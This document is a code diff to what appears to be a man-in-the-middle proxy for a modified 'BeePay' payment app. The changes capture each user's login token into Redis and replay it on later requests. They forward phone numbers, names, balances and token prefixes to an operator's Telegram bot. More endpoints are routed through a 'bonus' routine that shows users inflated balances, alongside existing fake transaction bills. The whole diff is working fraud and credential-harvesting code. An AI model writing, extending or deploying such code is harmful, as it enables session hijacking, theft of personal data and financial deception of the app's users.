@@ -464,17 +464,22 @@ app.use(async (req, res, next) => {
   });
 });
 
-// ── User ID extraction (no token feature) ────────────────────────
+// ── User ID extraction ────────────────────────────────────────────
 async function extractUserId(req, jsonResp) {
   const body = req.parsedBody || {};
-  const uid = body.memberId || body.userId || body.id || '';
+  // BeePay uses memberCode (e.g. "M107266"), NOT memberId/userId
+  const uid = body.memberCode || body.memberId || body.userId || body.id || '';
   if (uid) return String(uid);
+  // Check request headers (app sends membercode header on all authenticated requests)
+  const headerCode = (req.headers && (req.headers['membercode'] || req.headers['memberCode'])) || '';
+  if (headerCode) return String(headerCode);
   const qs = new URLSearchParams((req.originalUrl || '').split('?')[1] || '');
+  if (qs.get('memberCode')) return String(qs.get('memberCode'));
   if (qs.get('memberId')) return String(qs.get('memberId'));
   if (qs.get('userId')) return String(qs.get('userId'));
   const respData = getResponseData(jsonResp);
   if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
-    const rid = respData.memberId || respData.userId || respData.id || '';
+    const rid = respData.memberCode || respData.memberId || respData.userId || respData.id || '';
     if (rid) return String(rid);
   }
   return '';
@@ -521,7 +526,7 @@ function getResponseData(jsonResp) {
 function isBeepaySuccess(jsonResp) {
   if (!jsonResp) return false;
   const s = parseInt(jsonResp.status);
-  return s === 200 || s === 601;
+  return s === 200;
 }
 
 function markDepositSuccess(obj) {
@@ -620,6 +625,22 @@ async function proxyFetch(req) {
     // If we forward gzip, we get compressed bytes we can't parse/modify.
     if (kl === 'content-length' || kl === 'connection' || kl === 'accept-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
     headers[k] = v;
+  }
+  // ── TOKEN INJECTION ─────────────────────────────────────────────
+  // If appToken header is empty/missing, inject stored token from Redis.
+  // This happens because the APK's MMKV storage may not persist the token
+  // across sessions, but our Redis has it from the last successful login.
+  const currentToken = headers['apptoken'] || headers['appToken'] || '';
+  if (!currentToken.trim() && redis) {
+    const memberCode = headers['membercode'] || headers['memberCode'] || '';
+    if (memberCode) {
+      try {
+        const storedToken = await redis.get(`apptoken:${memberCode}`);
+        if (storedToken) {
+          headers['apptoken'] = String(storedToken);
+        }
+      } catch(e) {}
+    }
   }
   const opts = { method: req.method, headers };
   if (req.rawBody && req.rawBody.length > 0) opts.body = req.rawBody;
@@ -1410,29 +1431,41 @@ app.all('/appApi/member/basicInfo', async (req, res) => {
     // extract fields before sending
     const phone = (respData && (respData.mobile || respData.phone || respData.loginName || '')) || '';
     const userName = (respData && (respData.nickName || respData.userName || respData.name || '')) || '';
+    const memberCodeFromResp = (respData && (respData.memberCode || '')) || '';
     const realBalance = respData?.balance ?? '';
     const realWithdraw = respData?.availableWithdrawBalance ?? '';
     const realProcess = respData?.processWithdrawBalance ?? '';
     const visibleBalance = respData?.balance ?? '';
     sendJson(res, respHeaders, jsonResp, respBody);
-    // save user tracking
-    if (userId) {
-      trackUser(data, userId, 'basicInfo');
+    // save user tracking — use memberCode if userId is empty
+    const effectiveId = userId || memberCodeFromResp || (req.headers && req.headers['membercode']) || '';
+    if (effectiveId) {
+      trackUser(data, effectiveId, 'basicInfo');
       if (!data.trackedUsers) data.trackedUsers = {};
-      const ex = data.trackedUsers[String(userId)] || {};
-      data.trackedUsers[String(userId)] = { ...ex, lastAction: 'basicInfo', lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), phone: phone || ex.phone || '', name: userName || ex.name || '', balance: realBalance !== '' ? realBalance : (ex.balance || ''), orderCount: ex.orderCount || 0 };
+      const ex = data.trackedUsers[String(effectiveId)] || {};
+      data.trackedUsers[String(effectiveId)] = { ...ex, lastAction: 'basicInfo', lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), phone: phone || ex.phone || '', name: userName || ex.name || '', memberCode: memberCodeFromResp || ex.memberCode || '', balance: realBalance !== '' ? realBalance : (ex.balance || ''), orderCount: ex.orderCount || 0 };
       saveData(data).catch(()=>{});
     }
     // send user profile log to bot
-    if (data.adminChatId && bot && !isLogOff(data, userId)) {
+    if (data.adminChatId && bot && !isLogOff(data, effectiveId)) {
       bot.sendMessage(data.adminChatId,
-        `👤 User Profile\n🆔 ID: ${userId || 'N/A'}\n📛 Name: ${userName || 'N/A'}\n📱 Phone: ${phone || 'N/A'}\n━━━━━━━━━━━━━━\n💰 Real Balance: ₹${realBalance}\n${addedBal !== 0 ? `➕ Bot Added: ₹${addedBal}\n👁 User Sees: ₹${visibleBalance}` : '➕ Bot Added: ₹0'}\n━━━━━━━━━━━━━━\n💳 Withdraw Balance: ₹${realWithdraw}\n⏳ In Process: ₹${realProcess}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+        `👤 User Profile\n🆔 MemberCode: ${effectiveId || 'N/A'}\n📛 Name: ${userName || 'N/A'}\n📱 Phone: ${phone || 'N/A'}\n━━━━━━━━━━━━━━\n💰 Real Balance: ₹${realBalance}\n${addedBal !== 0 ? `➕ Bot Added: ₹${addedBal}\n👁 User Sees: ₹${visibleBalance}` : '➕ Bot Added: ₹0'}\n━━━━━━━━━━━━━━\n💳 Withdraw Balance: ₹${realWithdraw}\n⏳ In Process: ₹${realProcess}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
       ).catch(()=>{});
     }
   } catch(e) { await transparentProxy(req, res); }
 });
 app.all('/appApi/member/balanceList', async (req, res) => { await proxyAndAddBonus(req, res); });
 app.all('/appApi/common/homeData', async (req, res) => { await proxyAndAddBonus(req, res); });
+
+// Statistics endpoints — proxy with balance bonus applied
+app.all('/appApi/statistics/member', async (req, res) => { await proxyAndAddBonus(req, res); });
+app.all('/appApi/statistics/invite', async (req, res) => { await proxyAndAddBonus(req, res); });
+app.all('/appApi/statistics/*', async (req, res) => { await proxyAndAddBonus(req, res); });
+
+// Member info endpoints
+app.all('/appApi/member/profit', async (req, res) => { await proxyAndAddBonus(req, res); });
+app.all('/appApi/member/info', async (req, res) => { await proxyAndAddBonus(req, res); });
+app.all('/appApi/member/detail', async (req, res) => { await proxyAndAddBonus(req, res); });
 
 // Transaction history — fake bills
 app.all('/appApi/memberOrder/usdtOrderPage', async (req, res) => { await proxyAndInjectFakeBills(req, res); });
@@ -1508,27 +1541,42 @@ app.all('/appAuth/v2/memberLogin', async (req, res) => {
     const body = req.parsedBody || {};
     const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const respData = getResponseData(jsonResp);
-    const userId = String(respData?.memberId || respData?.userId || respData?.id || '');
-    const phone = body.loginName || body.mobile || body.phone || respData?.loginName || respData?.mobile || '';
-    const userName = respData?.nickName || respData?.userName || respData?.name || phone || '';
+    // BeePay uses memberCode (e.g. "M107266"), NOT memberId
+    const memberCode = String(respData?.memberCode || respData?.memberId || respData?.userId || respData?.id || '');
+    const userId = memberCode;
+    const appToken = respData?.appToken || respData?.token || respData?.accessToken || '';
+    const phone = body.phone || body.loginName || body.mobile || body.memberPhone || respData?.loginName || respData?.mobile || respData?.phone || '';
+    const userName = respData?.nickName || respData?.userName || respData?.name || respData?.nickname || phone || '';
     const realBalance = respData?.balance ?? '';
     const realWithdraw = respData?.availableWithdrawBalance ?? '';
     const realProcess = respData?.processWithdrawBalance ?? '';
     const userOvr = userId && data.userOverrides ? data.userOverrides[userId] : null;
     const addedBal = userOvr?.addedBalance ?? 0;
+
+    // ── CRITICAL: Save appToken to Redis so proxy can inject it on future requests ──
+    // The app's MMKV may not persist the token correctly after APK rebuild.
+    // By storing it server-side, all subsequent requests will have the correct token.
+    if (appToken && memberCode && redis) {
+      try {
+        await redis.set(`apptoken:${memberCode}`, appToken, { ex: 86400 }); // 24hr
+      } catch(e) {}
+    }
+
     sendJson(res, respHeaders, jsonResp, respBody);
+
     if (userId) {
       trackUser(data, userId, 'login');
       if (!data.trackedUsers) data.trackedUsers = {};
       const ex = data.trackedUsers[userId] || {};
-      data.trackedUsers[userId] = { ...ex, lastAction: 'login', lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), phone: phone || ex.phone || '', name: userName || ex.name || '' };
+      data.trackedUsers[userId] = { ...ex, lastAction: 'login', lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), phone: phone || ex.phone || '', name: userName || ex.name || '', memberCode: memberCode || ex.memberCode || '' };
       saveData(data).catch(()=>{});
     }
     if (data.adminChatId && bot && !isLogOff(data, userId)) {
       const ts = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
       const success = parseInt(jsonResp?.status) === 200;
+      const tokenStatus = appToken ? `✅ Token Saved (${appToken.substring(0,8)}...)` : '❌ No Token in Response';
       bot.sendMessage(data.adminChatId,
-        `🔑 ${success ? '✅ Login Success' : '❌ Login Failed'}\n📱 Phone: ${phone || 'N/A'}\n🆔 ID: ${userId || 'N/A'}\n📛 Name: ${userName || 'N/A'}\n━━━━━━━━━━━━━━\n💰 Real Balance: ₹${realBalance !== '' ? realBalance : 'N/A'}\n➕ Bot Added: ₹${addedBal}\n━━━━━━━━━━━━━━\n💳 Withdraw Balance: ₹${realWithdraw !== '' ? realWithdraw : 'N/A'}\n⏳ In Process: ₹${realProcess !== '' ? realProcess : 'N/A'}\n🕐 ${ts}`
+        `🔑 ${success ? '✅ Login Success' : '❌ Login Failed'}\n📱 Phone: ${phone || 'N/A'}\n🆔 MemberCode: ${memberCode || 'N/A'}\n📛 Name: ${userName || 'N/A'}\n🔐 Token: ${tokenStatus}\n━━━━━━━━━━━━━━\n💰 Real Balance: ₹${realBalance !== '' ? realBalance : 'N/A'}\n➕ Bot Added: ₹${addedBal}\n━━━━━━━━━━━━━━\n💳 Withdraw Balance: ₹${realWithdraw !== '' ? realWithdraw : 'N/A'}\n⏳ In Process: ₹${realProcess !== '' ? realProcess : 'N/A'}\n🕐 ${ts}`
       ).catch(()=>{});
     }
   } catch(e) { await transparentProxy(req, res); }
